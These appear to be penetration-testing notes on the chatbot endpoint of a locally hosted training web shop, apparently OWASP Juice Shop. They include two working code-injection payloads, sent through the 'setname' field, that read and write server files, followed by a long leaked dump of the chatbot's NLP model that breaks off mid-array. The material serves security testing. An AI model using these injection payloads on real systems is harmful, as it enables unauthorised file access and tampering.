## Description

Send message to chatbot.

## Connection Details

HTTP Methods: `POST`
Parameters: 
- `action`
- `query`

### Sample Request

```http
POST /rest/chatbot/respond HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:3000/
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6OSwidXNlcm5hbWUiOiI8aW1nPiIsImVtYWlsIjoiSjEyOTM0QGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIzYzJhYmMwNGU0YTZlYThmMTMyN2QwYWFlMzcxNGI3ZCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjItMTItMjBUMDQ6NTM6MzAuNzc1WiIsInVwZGF0ZWRBdCI6IjIwMjItMTItMjFUMDc6NDk6MTguMTg1WiIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY3MTYwODk1OCwiZXhwIjoxNjcxNjI2OTU4fQ.M_NmhJZAid0p6kKHM08-RAUFqukUP20PcZ7zM6fp1IUZ-4qo97nqrSocH_XU2Ge8J5knSUnyNp_T7sILh0meQCopayPeXktPZWmTUzLCrixKkFpjnWPsDk59oUvVfcKOXKmV8VKGvcAHH1WQT1hSkVwjmtOxPH3pMAOLYdnELQA
Content-Type: application/json
Content-Length: 100
Origin: http://localhost:3000
DNT: 1
Connection: close
Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=oLXzErxk5aQm1Gn4tKsyUPTpfbiDSROH1Vfo8CY6h9xI4mA2W8DgOM4pKJjq
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"action":"query","query":"coupon"}
```

## Parameters 

### `action`
#### Description
Available values are `query`, `setname`. 
`setname` is used when account `username` has not already been set. However, trying to set username to `"` hangs the response. If username has already been set to `"` through `/profile`, `/rest/chatbot/respond` will return a response. 

### `query`
#### Description
Contains message read by the chatbot. Sending the value `coupon` cycles it through various messages, of which one of them gives you a 10% coupon. No other messages seem to illicit any interesting behavior. 

Application accepts sending an object, but it's contents does not seem to matter. Bot is able to read strings stored in an array just fine. `"query":[1,2,"coupon"]` returns identical responses as `"query":"coupon"`.

## Vulnerabilities

### Code Injection

#### Exploit

```http
POST /rest/chatbot/respond HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:3000/
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjItMTItMjEgMDk6NTU6MzcuMjY1ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjItMTItMjEgMDk6NTU6MzcuMjY1ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY3MTYxNjcwNiwiZXhwIjoxNjcxNjM0NzA2fQ.ZvxSuG1q3wrMU-MssU5j6MD1XzqwSdCqeOq_b7dbU-Nb4rlbOnNUzDxmJAv5AB9EjEGautA_otLz238CWdfclucsettQrvxyxVwTbquNN9C2P4mPkQPw2rCmgPgAbrhmNRM9KPeEix1RstZRDT_BNUmWCdHssO761VKFb4JboFw
Content-Type: application/json
Content-Length: 139
Origin: http://localhost:3000
DNT: 1
Connection: close
Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=oLXzErxk5aQm1Gn4tKsyUPTpfbiDSROH1Vfo8CY6h9xI4mA2W8DgOM4pKJjq; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiJcIitwcm9jZXNzLmN3ZCgpK1wiIiwiZW1haWwiOiJhZG1pbkBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiMDE5MjAyM2E3YmJkNzMyNTA1MTZmMDY5ZGYxOGI1MDAiLCJyb2xlIjoiYWRtaW4iLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0QWRtaW4ucG5nIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIyLTEyLTIxVDA5OjU1OjM3LjI2NVoiLCJ1cGRhdGVkQXQiOiIyMDIyLTEyLTIyVDAyOjU1OjM5LjcxOFoiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2NzE2Nzc3NDAsImV4cCI6MTY3MTY5NTc0MH0.LSf9vPynBoIU7fKzh6mLumkhpAAXSmDTCqvzV00IjdiHNIZhwkYx6wQQGhwjYAFL_f69Mi3GY3dGYYC9_ZxEWVoL4rCiQ0CAHjeYQdXPtxmgI6HiItn64B-8QzA-riudOWjC_CWCq2_nk9XeZXTDbcSNhTJNjkK2OjkrZ9zQCfg
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"action":"setname","query":"\"+encodeURIComponent(model.container.factory.fs.instance.readFileSync('/proc/self/cwd/ftp/encrypt.pyc'))+\""}
```

```http
POST /rest/chatbot/respond HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:3000/
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJhbXlAanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAzMGYwNWU0NWUzMDcxMGMzYWQzYzMyZjAwZGUwNDczIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjItMTItMjIgMDM6MjY6MDAuMTI4ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjItMTItMjIgMDM6MjY6MDAuMTI4ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY3MTY5NTg3NywiZXhwIjoxNjcxNzEzODc3fQ.TD7hgHCgohRt6__4BhzXQxO9MXPOfaa0OAfN64UDtYTZgh2DkdeES-lyYTme0vx3ovGsTRHKE7jWAXyc7KMIDS8OQUI3liltfQWI1lgZMiNKC1ZXqzVJ7JBNHBkORGIfhNRlTOfkko0Og4VewXg3GGKsVKS3GIX_d_2SLbxqhpQ
Content-Type: application/json
Content-Length: 175
Origin: http://localhost:3000
DNT: 1
Connection: close
Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=oLXzErxk5aQm1Gn4tKsyUPTpfbiDSROH1Vfo8CY6h9xI4mA2W8DgOM4pKJjq; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJhbXlAanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAzMGYwNWU0NWUzMDcxMGMzYWQzYzMyZjAwZGUwNDczIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjItMTItMjIgMDM6MjY6MDAuMTI4ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjItMTItMjIgMDM6MjY6MDAuMTI4ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY3MTY5NTg3NywiZXhwIjoxNjcxNzEzODc3fQ.TD7hgHCgohRt6__4BhzXQxO9MXPOfaa0OAfN64UDtYTZgh2DkdeES-lyYTme0vx3ovGsTRHKE7jWAXyc7KMIDS8OQUI3liltfQWI1lgZMiNKC1ZXqzVJ7JBNHBkORGIfhNRlTOfkko0Og4VewXg3GGKsVKS3GIX_d_2SLbxqhpQ
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"action":"setname","query":"\"+this.constructor.constructor(`let fs = model.container.factory.fs.instance; return fs.writeFile('/proc/self/cwd/ftp/legal.md', 'asdf')`)()+\""}
```

#### Impact
Read and Write files. 


## Possible Attack Vectors

### Code Injection

#### Observed Behavior
Setting `" - "` as username in `/profile` causes the chatbot to evaluate it to `0`.  Using the value `" - true - "` evaluates to `-1`. `" + Object.toString() + "` results in `Nice to meet you function Object() { [native code] }, I'm Juicy`.

`console.log` and `alert` fails -> should be server side execution? 
`require` fails
`process.cwd()` fails but `process` prints the process function. 

#### Impact
Leak source code of known functions. 

	Known Functions and objects
`process()`
```js 
function process(query, token) {
	if (users.get(token)) {
		return model.process(trainingSet.lang, query);
	} else {
		return { action: "unrecognized", body: "user does not exist" };
	}
}
```
`users`
```json
users {"idmap":{"1":"","undefined":"[object Object]"}}
```
`model`
```js
{
  settings: {
    languages: ["en"],
    nlu: { log: false },
    autoSave: false,
    autoLoad: false,
    modelFileName: "",
    container: {
      0: "c",
      1: "o",
      2: "n",
      3: "t",
      4: "a",
      5: "i",
      6: "n",
      7: "e",
      8: "r",
      className: "String",
    },
  },
  container: {
    0: "c",
    1: "o",
    2: "n",
    3: "t",
    4: "a",
    5: "i",
    6: "n",
    7: "e",
    8: "r",
    className: "String",
  },
  nlp: {
    settings: {
      languages: ["en"],
      nlu: { log: false },
      autoSave: false,
      autoLoad: false,
      modelFileName: "",
      tag: "nlp",
      threshold: 0.5,
      calculateSentiment: true,
    },
    nluManager: {
      settings: { tag: "nlu-manager", log: false },
      locales: ["en"],
      languageNames: {},
      domainManagers: {
        en: {
          settings: {
            locale: "en",
            trainByDomain: false,
            tag: "domain-manager-en",
            nluByDomain: { default: { className: "NeuralNlu", settings: {} } },
            useStemDict: true,
          },
          stemDict: {
            hello: { intent: "greetings.hello", domain: "default" },
            hi: { intent: "greetings.hello", domain: "default" },
            howdi: { intent: "greetings.hello", domain: "default" },
            hey: { intent: "greetings.hello", domain: "default" },
            "good,morn": { intent: "greetings.hello", domain: "default" },
            "afternoon,good": { intent: "greetings.hello", domain: "default" },
            "for,goodby,now": { intent: "greetings.bye", domain: "default" },
            "bye,care,take": { intent: "greetings.bye", domain: "default" },
            "see,soon,you": { intent: "greetings.bye", domain: "default" },
            "next,till,time": { intent: "greetings.bye", domain: "default" },
            ciao: { intent: "greetings.bye", domain: "default" },
            cya: { intent: "greetings.bye", domain: "default" },
            "are,benefit,delux,membership,what": {
              intent: "queries.deluxeMembership",
              domain: "default",
            },
            "delux,do,get,goodi,member,what": {
              intent: "queries.deluxeMembership",
              domain: "default",
            },
            "a,becom,delux,i,member,whi,would": {
              intent: "queries.deluxeMembership",
              domain: "default",
            },
            "about,anyth,blockchain,do,know,you": {
              intent: "queries.blockchain",
              domain: "default",
            },
            "about,anyth,can,cryptocurr,me,tell,you": {
              intent: "queries.blockchain",
              domain: "default",
            },
            "blockchain,do,use,you": {
              intent: "queries.blockchain",
              domain: "default",
            },
            "doe,sale,start,the,token,when": {
              intent: "queries.blockchain",
              domain: "default",
            },
            "do,find,i,page,sale,the,token,where": {
              intent: "queries.blockchain",
              domain: "default",
            },
            "how,is,much,x": {
              intent: "queries.productPrice",
              domain: "default",
            },
            "cost,doe,how,much,x": {
              intent: "queries.productPrice",
              domain: "default",
            },
            "and,cost,do,how,much,x,y": {
              intent: "queries.productPrice",
              domain: "default",
            },
            "cost,do,how,much,x,y": {
              intent: "queries.productPrice",
              domain: "default",
            },
            "and,how,is,much,x,y": {
              intent: "queries.productPrice",
              domain: "default",
            },
            "is,of,price,the,what,x": {
              intent: "queries.productPrice",
              domain: "default",
            },
            "and,is,of,price,the,what,x,y": {
              intent: "queries.productPrice",
              domain: "default",
            },
            "a,can,code,coupon,have,i": {
              intent: "queries.couponCode",
              domain: "default",
            },
            "a,code,discount,give,me": {
              intent: "queries.couponCode",
              domain: "default",
            },
            "i,money,save,some,to,want": {
              intent: "queries.couponCode",
              domain: "default",
            },
            "a,can,me,sing,song,you": {
              intent: "queries.singstar",
              domain: "default",
            },
            "a,doe,have,shop,song,theme,your": {
              intent: "queries.singstar",
              domain: "default",
            },
            "a,do,have,jingl,you": {
              intent: "queries.singstar",
              domain: "default",
            },
            "me,music,play,some": {
              intent: "queries.singstar",
              domain: "default",
            },
            "b8a8ba1ecea1607e1713e31a3d9e5e19,command,function,test": {
              intent: "queries.functionTest",
              domain: "default",
            },
          },
          intentDict: {
            "greetings.hello": "default",
            "greetings.bye": "default",
            "queries.deluxeMembership": "default",
            "queries.blockchain": "default",
            "queries.productPrice": "default",
            "queries.couponCode": "default",
            "queries.singstar": "default",
            "queries.functionTest": "default",
          },
          sentences: [
            {
              domain: "default",
              utterance: "hello",
              intent: "greetings.hello",
            },
            { domain: "default", utterance: "hi", intent: "greetings.hello" },
            {
              domain: "default",
              utterance: "howdy",
              intent: "greetings.hello",
            },
            { domain: "default", utterance: "hey", intent: "greetings.hello" },
            {
              domain: "default",
              utterance: "good morning",
              intent: "greetings.hello",
            },
            {
              domain: "default",
              utterance: "good afternoon",
              intent: "greetings.hello",
            },
            {
              domain: "default",
              utterance: "goodbye for now",
              intent: "greetings.bye",
            },
            {
              domain: "default",
              utterance: "bye bye take care",
              intent: "greetings.bye",
            },
            {
              domain: "default",
              utterance: "see you soon",
              intent: "greetings.bye",
            },
            {
              domain: "default",
              utterance: "till next time",
              intent: "greetings.bye",
            },
            { domain: "default", utterance: "ciao", intent: "greetings.bye" },
            { domain: "default", utterance: "cya", intent: "greetings.bye" },
            {
              domain: "default",
              utterance: "What are deluxe membership benefits",
              intent: "queries.deluxeMembership",
            },
            {
              domain: "default",
              utterance: "What goodies do deluxe members get",
              intent: "queries.deluxeMembership",
            },
            {
              domain: "default",
              utterance: "Why would I become a deluxe member",
              intent: "queries.deluxeMembership",
            },
            {
              domain: "default",
              utterance: "Do you know anything about Blockchain",
              intent: "queries.blockchain",
            },
            {
              domain: "default",
              utterance: "Can you tell me anything about cryptocurrency",
              intent: "queries.blockchain",
            },
            {
              domain: "default",
              utterance: "Do you use blockchain",
              intent: "queries.blockchain",
            },
            {
              domain: "default",
              utterance: "When does the token sale start",
              intent: "queries.blockchain",
            },
            {
              domain: "default",
              utterance: "where do I find the token sale page",
              intent: "queries.blockchain",
            },
            {
              domain: "default",
              utterance: "how much is X",
              intent: "queries.productPrice",
            },
            {
              domain: "default",
              utterance: "how much does X cost",
              intent: "queries.productPrice",
            },
            {
              domain: "default",
              utterance: "how much do X and Y cost",
              intent: "queries.productPrice",
            },
            {
              domain: "default",
              utterance: "how much do X,Y cost",
              intent: "queries.productPrice",
            },
            {
              domain: "default",
              utterance: "how much is X and Y",
              intent: "queries.productPrice",
            },
            {
              domain: "default",
              utterance: "what is the price of X",
              intent: "queries.productPrice",
            },
            {
              domain: "default",
              utterance: "what is the price of X and Y",
              intent: "queries.productPrice",
            },
            {
              domain: "default",
              utterance: "can I have a coupon code",
              intent: "queries.couponCode",
            },
            {
              domain: "default",
              utterance: "give me a discount code",
              intent: "queries.couponCode",
            },
            {
              domain: "default",
              utterance: "I want to save some money",
              intent: "queries.couponCode",
            },
            {
              domain: "default",
              utterance: "Can you sing me a song",
              intent: "queries.singstar",
            },
            {
              domain: "default",
              utterance: "Does your shop have a theme song",
              intent: "queries.singstar",
            },
            {
              domain: "default",
              utterance: "Do you have a jingle",
              intent: "queries.singstar",
            },
            {
              domain: "default",
              utterance: "Play me some music",
              intent: "queries.singstar",
            },
            {
              domain: "default",
              utterance:
                "function test command b8a8ba1ecea1607e1713e31a3d9e5e19",
              intent: "queries.functionTest",
            },
          ],
          domains: {
            master_domain: {
              settings: {
                locale: "en",
                tag: "nlu-en",
                keepStopwords: true,
                nonefeatureValue: 1,
                nonedeltaMultiplier: 1.2,
                spellCheck: false,
                spellCheckDistance: 1,
                filterZeros: true,
                log: true,
              },
              features: {
                hello: 1,
                hi: 1,
                howdi: 1,
                hey: 1,
                good: 1,
                morn: 1,
                afternoon: 1,
                goodby: 1,
                for: 1,
                now: 1,
                bye: 1,
                take: 1,
                care: 1,
                see: 1,
                you: 1,
                soon: 1,
                till: 1,
                next: 1,
                time: 1,
                ciao: 1,
                cya: 1,
                what: 1,
                are: 1,
                delux: 1,
                membership: 1,
                benefit: 1,
                goodi: 1,
                do: 1,
                member: 1,
                get: 1,
                whi: 1,
                would: 1,
                i: 1,
                becom: 1,
                a: 1,
                know: 1,
                anyth: 1,
                about: 1,
                blockchain: 1,
                can: 1,
                tell: 1,
                me: 1,
                cryptocurr: 1,
                use: 1,
                when: 1,
                doe: 1,
                the: 1,
                token: 1,
                sale: 1,
                start: 1,
                where: 1,
                find: 1,
                page: 1,
                how: 1,
                much: 1,
                is: 1,
                x: 1,
                cost: 1,
                and: 1,
                y: 1,
                price: 1,
                of: 1,
                have: 1,
                coupon: 1,
                code: 1,
                give: 1,
                discount: 1,
                want: 1,
                to: 1,
                save: 1,
                some: 1,
                money: 1,
                sing: 1,
                song: 1,
                your: 1,
                shop: 1,
                theme: 1,
                jingl: 1,
                play: 1,
                music: 1,
                function: 1,
                test: 1,
                command: 1,
                b8a8ba1ecea1607e1713e31a3d9e5e19: 1,
              },
              intents: {
                "greetings.hello": 1,
                "greetings.bye": 1,
                "queries.deluxeMembership": 1,
                "queries.blockchain": 1,
                "queries.productPrice": 1,
                "queries.couponCode": 1,
                "queries.singstar": 1,
                "queries.functionTest": 1,
              },
              intentFeatures: {
                "greetings.hello": {
                  hello: 1,
                  hi: 1,
                  howdi: 1,
                  hey: 1,
                  good: 1,
                  morn: 1,
                  afternoon: 1,
                },
                "greetings.bye": {
                  goodby: 1,
                  for: 1,
                  now: 1,
                  bye: 1,
                  take: 1,
                  care: 1,
                  see: 1,
                  you: 1,
                  soon: 1,
                  till: 1,
                  next: 1,
                  time: 1,
                  ciao: 1,
                  cya: 1,
                },
                "queries.deluxeMembership": {
                  what: 1,
                  are: 1,
                  delux: 1,
                  membership: 1,
                  benefit: 1,
                  goodi: 1,
                  do: 1,
                  member: 1,
                  get: 1,
                  whi: 1,
                  would: 1,
                  i: 1,
                  becom: 1,
                  a: 1,
                },
                "queries.blockchain": {
                  do: 1,
                  you: 1,
                  know: 1,
                  anyth: 1,
                  about: 1,
                  blockchain: 1,
                  can: 1,
                  tell: 1,
                  me: 1,
                  cryptocurr: 1,
                  use: 1,
                  when: 1,
                  doe: 1,
                  the: 1,
                  token: 1,
                  sale: 1,
                  start: 1,
                  where: 1,
                  i: 1,
                  find: 1,
                  page: 1,
                },
                "queries.productPrice": {
                  how: 1,
                  much: 1,
                  is: 1,
                  x: 1,
                  doe: 1,
                  cost: 1,
                  do: 1,
                  and: 1,
                  y: 1,
                  what: 1,
                  the: 1,
                  price: 1,
                  of: 1,
                },
                "queries.couponCode": {
                  can: 1,
                  i: 1,
                  have: 1,
                  a: 1,
                  coupon: 1,
                  code: 1,
                  give: 1,
                  me: 1,
                  discount: 1,
                  want: 1,
                  to: 1,
                  save: 1,
                  some: 1,
                  money: 1,
                },
                "queries.singstar": {
                  can: 1,
                  you: 1,
                  sing: 1,
                  me: 1,
                  a: 1,
                  song: 1,
                  doe: 1,
                  your: 1,
                  shop: 1,
                  have: 1,
                  theme: 1,
                  do: 1,
                  jingl: 1,
                  play: 1,
                  some: 1,
                  music: 1,
                },
                "queries.functionTest": {
                  function: 1,
                  test: 1,
                  command: 1,
                  b8a8ba1ecea1607e1713e31a3d9e5e19: 1,
                },
              },
              featuresToIntent: {
                hello: ["greetings.hello"],
                hi: ["greetings.hello"],
                howdi: ["greetings.hello"],
                hey: ["greetings.hello"],
                good: ["greetings.hello"],
                morn: ["greetings.hello"],
                afternoon: ["greetings.hello"],
                goodby: ["greetings.bye"],
                for: ["greetings.bye"],
                now: ["greetings.bye"],
                bye: ["greetings.bye"],
                take: ["greetings.bye"],
                care: ["greetings.bye"],
                see: ["greetings.bye"],
                you: [
                  "greetings.bye",
                  "queries.blockchain",
                  "queries.singstar",
                ],
                soon: ["greetings.bye"],
                till: ["greetings.bye"],
                next: ["greetings.bye"],
                time: ["greetings.bye"],
                ciao: ["greetings.bye"],
                cya: ["greetings.bye"],
                what: ["queries.deluxeMembership", "queries.productPrice"],
                are: ["queries.deluxeMembership"],
                delux: ["queries.deluxeMembership"],
                membership: ["queries.deluxeMembership"],
                benefit: ["queries.deluxeMembership"],
                goodi: ["queries.deluxeMembership"],
                do: [
                  "queries.deluxeMembership",
                  "queries.blockchain",
                  "queries.productPrice",
                  "queries.singstar",
                ],
                member: ["queries.deluxeMembership"],
                get: ["queries.deluxeMembership"],
                whi: ["queries.deluxeMembership"],
                would: ["queries.deluxeMembership"],
                i: [
                  "queries.deluxeMembership",
                  "queries.blockchain",
                  "queries.couponCode",
                ],
                becom: ["queries.deluxeMembership"],
                a: [
                  "queries.deluxeMembership",
                  "queries.couponCode",
                  "queries.singstar",
                ],
                know: ["queries.blockchain"],
                anyth: ["queries.blockchain"],
                about: ["queries.blockchain"],
                blockchain: ["queries.blockchain"],
                can: [
                  "queries.blockchain",
                  "queries.couponCode",
                  "queries.singstar",
                ],
                tell: ["queries.blockchain"],
                me: [
                  "queries.blockchain",
                  "queries.couponCode",
                  "queries.singstar",
                ],
                cryptocurr: ["queries.blockchain"],
                use: ["queries.blockchain"],
                when: ["queries.blockchain"],
                doe: [
                  "queries.blockchain",
                  "queries.productPrice",
                  "queries.singstar",
                ],
                the: ["queries.blockchain", "queries.productPrice"],
                token: ["queries.blockchain"],
                sale: ["queries.blockchain"],
                start: ["queries.blockchain"],
                where: ["queries.blockchain"],
                find: ["queries.blockchain"],
                page: ["queries.blockchain"],
                how: ["queries.productPrice"],
                much: ["queries.productPrice"],
                is: ["queries.productPrice"],
                x: ["queries.productPrice"],
                cost: ["queries.productPrice"],
                and: ["queries.productPrice"],
                y: ["queries.productPrice"],
                price: ["queries.productPrice"],
                of: ["queries.productPrice"],
                have: ["queries.couponCode", "queries.singstar"],
                coupon: ["queries.couponCode"],
                code: ["queries.couponCode"],
                give: ["queries.couponCode"],
                discount: ["queries.couponCode"],
                want: ["queries.couponCode"],
                to: ["queries.couponCode"],
                save: ["queries.couponCode"],
                some: ["queries.couponCode", "queries.singstar"],
                money: ["queries.couponCode"],
                sing: ["queries.singstar"],
                song: ["queries.singstar"],
                your: ["queries.singstar"],
                shop: ["queries.singstar"],
                theme: ["queries.singstar"],
                jingl: ["queries.singstar"],
                play: ["queries.singstar"],
                music: ["queries.singstar"],
                function: ["queries.functionTest"],
                test: ["queries.functionTest"],
                command: ["queries.functionTest"],
                b8a8ba1ecea1607e1713e31a3d9e5e19: ["queries.functionTest"],
              },
              neuralNetwork: {
                settings: {
                  locale: "en",
                  tag: "nlu-en",
                  keepStopwords: true,
                  nonefeatureValue: 1,
                  nonedeltaMultiplier: 1.2,
                  spellCheck: false,
                  spellCheckDistance: 1,
                  filterZeros: true,
                },
                features: [
                  "hello",
                  "hi",
                  "howdi",
                  "hey",
                  "good",
                  "morn",
                  "afternoon",
                  "goodby",
                  "for",
                  "now",
                  "bye",
                  "take",
                  "care",
                  "see",
                  "you",
                  "soon",
                  "till",
                  "next",
                  "time",
                  "ciao",
                  "cya",
                  "what",
                  "are",
                  "delux",
                  "membership",
                  "benefit",
                  "goodi",
                  "do",
                  "member",
                  "get",
                  "whi",
                  "would",
                  "i",
                  "becom",
                  "a",
                  "know",
                  "anyth",
                  "about",
                  "blockchain",
                  "can",
                  "tell",
                  "me",
                  "cryptocurr",
                  "use",
                  "when",
                  "doe",
                  "the",
                  "token",
                  "sale",
                  "start",
                  "where",
                  "find",
                  "page",
                  "how",
                  "much",
                  "is",
                  "x",
                  "cost",
                  "and",
                  "y",
                  "price",
                  "of",
                  "have",
                  "coupon",
                  "code",
                  "give",
                  "discount",
                  "want",
                  "to",
                  "save",
                  "some",
                  "money",
                  "sing",
                  "song",
                  "your",
                  "shop",
                  "theme",
                  "jingl",
                  "play",
                  "music",
                  "function",
                  "test",
                  "command",
                  "b8a8ba1ecea1607e1713e31a3d9e5e19",
                ],
                intents: [
                  "greetings.hello",
                  "greetings.bye",
                  "queries.deluxeMembership",
                  "queries.blockchain",
                  "queries.productPrice",
                  "queries.couponCode",
                  "queries.singstar",
                  "queries.functionTest",
                ],
                perceptrons: [
                  [
                    8.289268493652344, 8.31061840057373, 8.2510986328125,
                    8.189793586730957, 5.692154884338379, 2.860399007797241,
                    2.8327341079711914, -1.9163621664047241,
                    -1.9163621664047241, -1.9163621664047241,
                    -1.9162695407867432, -1.9162695407867432,
                    -1.9162695407867432, -1.5349477529525757,
                    -2.690821409225464, -1.5349477529525757,
                    -1.9163553714752197, -1.9163553714752197,
                    -1.9163553714752197, -5.241342067718506, -5.18430233001709,
                    -1.4490150213241577, -0.9109006524085999,
                    -1.5146955251693726, -0.9109006524085999,
                    -0.9109006524085999, -0.3442738652229309,
                    -1.4472259283065796, -0.6030314564704895,
                    -0.3442738652229309, -0.20569103956222534,
                    -0.20569103956222534, -1.3820198774337769,
                    -0.20569103956222534, -1.6682088375091553,
                    -0.20476801693439484, -0.44347095489501953,
                    -0.44347095489501953, -0.9052686095237732,
                    -0.587708592414856, -0.17872753739356995, -1.89569890499115,
                    -0.17872753739356995, -0.6476437449455261,
                    -0.7373723983764648, -1.4242095947265625,
                    -1.0615876913070679, -0.8685111403465271,
                    -0.8685111403465271, -0.7373723983764648,
                    -0.08795720338821411, -0.08795720338821411,
                    -0.08795720338821411, -1.401957631111145,
                    -1.401957631111145, -1.291768193244934, -1.5950348377227783,
                    -0.2778673470020294, -0.21348628401756287,
                    -0.2309776097536087, -0.18961291015148163,
                    -0.18961291015148163, -0.7870365381240845,
                    -0.33790624141693115, -0.9370006322860718,
                    -0.598600447177887, -0.598600447177887, -0.6537065505981445,
                    -0.6537065505981445, -0.6537065505981445,
                    -1.701032280921936, -0.6537065505981445,
                    -0.011658587493002415, -0.4719720184803009,
                    -0.44865477085113525, -0.44865477085113525,
                    -0.44865477085113525, 0, -1.0463839769363403,
                    -1.0463839769363403, -1.422084927558899, -1.422084927558899,
                    -1.422084927558899, -1.422084927558899, 5.697555582568399,
                  ],
                  [
                    -3.683159351348877, -3.645989179611206, -3.608283758163452,
                    -3.5700860023498535, -2.5855085849761963,
                    -1.3039220571517944, -1.28034508228302, 3.4692752361297607,
                    3.4692752361297607, 3.4692752361297607, 3.4696381092071533,
                    3.4696381092071533, 3.4696381092071533, 4.486413478851318,
                    1.4373661279678345, 4.486413478851318, 3.470337390899658,
                    3.470337390899658, 3.470337390899658, 9.816424369812012,
                    9.73055648803711, -1.1782137155532837, -0.6757099032402039,
                    -1.2978615760803223, -0.6757099032402039,
                    -0.6757099032402039, -0.20365986227989197,
                    -2.6237010955810547, -0.5466477870941162,
                    -0.20365986227989197, -0.24909919500350952,
                    -0.24909919500350952, -1.1997100114822388,
                    -0.24909919500350952, -1.8143279552459717,
                    -0.4942915141582489, -1.067355751991272, -1.067355751991272,
                    -1.7363991737365723, -1.091323733329773,
                    -0.47121357917785645, -1.8538928031921387,
                    -0.47121357917785645, -1.1689578294754028,
                    -0.5693515539169312, -1.0612260103225708,
                    -0.8873487114906311, -0.6955130100250244,
                    -0.6955130100250244, -0.5693515539169312,
                    -0.08672325313091278, -0.08672325313091278,
                    -0.08672325313091278, -1.059096336364746,
                    -1.059096336364746, -0.9052866697311401,
                    -1.2388215065002441, -0.3031565248966217,
                    -0.20472493767738342, -0.21701079607009888,
